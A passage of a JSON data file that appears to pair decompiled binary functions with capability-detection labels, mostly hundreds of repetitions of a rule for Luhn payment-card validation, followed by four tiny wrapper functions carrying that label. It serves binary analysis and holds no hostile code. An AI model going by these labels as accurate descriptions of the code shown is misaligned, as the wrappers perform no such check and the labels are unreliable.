            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00484c05(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040485e(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00460e4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460e4e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 58
    },
    "004610e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004610e2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004058f3(arg_8h, arg_ch, arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 57
    },
    "004627a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004627a8(uint32_t arg_8h)\n\n{\n    if (arg_8h == 0) {\n        fcn.004049cb();\n        fcn.00406401(4);\n        return;\n    }\n    fcn.004045f2((arg_8h & 7) * 0x18 + 0x56f128);\n    return;\n}\n",
        "token_count": 89
    },
